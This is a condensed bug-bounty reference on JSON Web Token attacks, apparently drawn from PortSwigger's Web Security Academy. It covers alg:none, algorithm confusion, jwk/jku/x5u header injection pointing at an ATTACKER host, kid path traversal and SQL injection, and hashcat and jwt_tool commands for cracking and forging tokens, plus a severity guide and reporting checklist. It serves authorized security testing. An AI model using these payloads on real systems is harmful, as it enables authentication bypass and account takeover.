# JWT Attack Playbook

> Source: PortSwigger Web Security Academy — JWT attacks (portswigger.net/web-security/jwt). Compressed for bug-bounty reference.

**Structure:** `header.payload.signature` — base64url JSON (header = algo/key metadata; payload = claims: `sub`, `role`, `exp`, `iss`, `aud`). Security rests entirely on the signature; claims are readable AND modifiable by anyone. "JWT" in practice = JWS (signed).

## Quick Detection

1. Token starts `eyJ...` (base64url `{`) with 2 dots → JWT.
2. Decode: `echo -n '<b64url>' | base64 -d 2>/dev/null` or python:
   ```python
   import base64,json; d=lambda s: json.loads(base64.urlsafe_b64decode(s+'=='))
   ```
3. Tools: jwt.io (debugger), jwt_tool, Burp JWT Editor extension (JWT tab in Repeater).
4. Inspect header for attacker-controllable params: **`jku`** (key-set URL), **`jwk`** (embedded key), **`x5u`/`x5c`** (cert URL/chain), **`kid`** (key ID — file path or DB lookup), **`alg`**, **`cty`**.
5. Probe server: sig verified at all? which algs accepted? `exp` checked?

## Attack Vectors

| # | Vector | Technique | Prereq |
|---|--------|-----------|--------|
| 1 | Unverified claims tampering | Dev calls `decode()` not `verify()` (e.g. Node jsonwebtoken) — sig never checked. Edit `sub`/`username`/`isAdmin`/`role`, keep old sig. | Any JWT app; test by tampering & replaying |
| 2 | `alg: none` | Set `"alg":"none"`, strip signature, keep trailing dot. Bypass filters with case/encoding: `NoNe`, `nOnE`. | Server accepts unsigned tokens |
| 3 | Alg confusion (HS256/RS256) | Server signs RS256 but verifies via alg header: change alg to HS256, sign with the **public key** as HMAC secret (fetch from `/.well-known/jwks.json` / jwks URL). | Public key obtainable; lib trusts `alg` |
| 4 | `jwk` injection | Embed your own RSA public key in `jwk` header, sign with matching private key, match `kid`. Burp JWT Editor: Attack → Embedded JWK. | Server uses embedded key |
| 5 | `jku` injection | Point `jku` to attacker-hosted JWKS (`https://attacker/.well-known/jwks.json`), sign with own key. If domain-whitelisted: try SSRF URL-parsing bypasses. | Server fetches `jku` URL |
| 6 | `x5u`/`x5c` injection | Same idea via X.509 cert chain headers — inject self-signed cert. Complex ASN.1 parsers may also be vulnerable (cf. CVE-2017-2800, CVE-2018-2633). | Server honors x5u/x5c |
| 7 | `kid` path traversal | `kid` used as filename: `"kid":"../../dev/null"` with HS256 → key = empty file = empty-string secret, sign with empty key. Any predictable static file works. | kid → file lookup |
| 8 | `kid` SQL injection | `kid` used for DB key lookup → inject SQL to return controlled value as key. | kid → DB lookup |
| 9 | HS256 secret brute-force | Weak/default/pasted-from-tutorial secret. Offline crack, then re-sign arbitrary tokens. | Valid signed JWT + wordlist |
| 10 | Leaked key signing | Secret leaked via repo, debug endpoint, or cracked above → forge any token. | Key material |
| 11 | Expiry not enforced | Expired token still accepted; with valid sig, test long-lived tokens & no revocation on logout. | No `exp` check / no revocation |
| 12 | `cty` injection (chained) | After sig bypass, add `"cty":"text/xml"` or `application/x-java-serialized-object` → XXE / deserialization vectors. | Sig bypass achieved |

## Payload / Bypass Table

| Target | Payload / Command |
|--------|-------------------|
| alg none | `{"alg":"none","typ":"JWT"}` + payload + trailing `.` (empty sig) |
| none obfuscation | `"alg":"None"` / `"nOnE"` / unexpected encoding |
| jwk embed | Add `"jwk":{"kty":"RSA","e":"AQAB","kid":"<yours>","n":"<yours>"}` + your sig |
| jku inject | `"jku":"https://ATTACKER/jwks.json","kid":"<your kid>"` |
| x5u inject | `"x5u":"https://ATTACKER/cert.pem"` |
| kid traversal | `"kid":"../../../../dev/null","alg":"HS256"` → sign with empty string |
| kid SQLi | `"kid":"x' UNION SELECT '<secret>' -- "` (tune per DB) |
| hashcat brute | `hashcat -a 0 -m 16500 <jwt> <wordlist>` (rerun: add `--show`) |
| jwt_tool tamper | `python3 jwt_tool.py <token> -T` (tamper) |
| jwt_tool none | `python3 jwt_tool.py <token> -X a` (alg:none attack) |
| jwt_tool confusion | `python3 jwt_tool.py <token> -X k -pk public.pem` (key confusion) |
| jwt_tool crack | `python3 jwt_tool.py <token> -C -d wordlist.txt` |
| Sign w/ known key | `python3 jwt_tool.py <token> -S hs256 -p '<secret>'` |

## By-Design Filters — SKIP

- Token format/csrf-style design choices, JWT-vs-JWS-vs-JWE spec trivia, lab navigation, "how to study" text.
- Library-only hardening advice (prevent sections) — recon value only, not reportable.

## Severity Guide

| Finding | Severity |
|---------|----------|
| Full auth bypass: forge arbitrary user/admin token (none / confusion / cracked key / jku-jwk injection) | **CRITICAL** |
| Account takeover via claim tampering (`sub`/username) | **CRITICAL** |
| Privilege escalation via `role`/`isAdmin` claim accepted unverified | **HIGH** |
| kid path traversal / SQLi working | **HIGH** (SQLi may be CRIT) |
| HS256 secret brute-forceable (weak/default secret) | **HIGH** |
| Expired tokens accepted / no revocation | **MEDIUM** |
| `jku`/`x5u` accepted but SSRF-bypass unproven; tokens in URLs; missing `aud` | **LOW/INFO** |

## Reporting Checklist

- [ ] Original token + forged token (decoded before/after) included.
- [ ] Full request(s) proving impact (whoami/admin endpoint response).
- [ ] Step-by-step repro: tool, commands, keys used.
- [ ] Impact = real privilege escalation / account takeover, not just decode.
- [ ] alg:none: trailing-dot token accepted server-side (not client-only parse).
- [ ] Confusion: show public key source + HMAC verification succeeded.
- [ ] jku/jwk/x5u: show attacker key was fetched/trusted (callback log or valid sig).
- [ ] Brute-force: wordlist name + cracked secret (redact) + re-signed proof token.
- [ ] Expiry/revocation findings: timestamp + accepted-request evidence.

> ⚠️ Blocked/unproven exploit chain = INFORMATIONAL per master KB rule. Never claim HIGH/CRIT from theory alone.
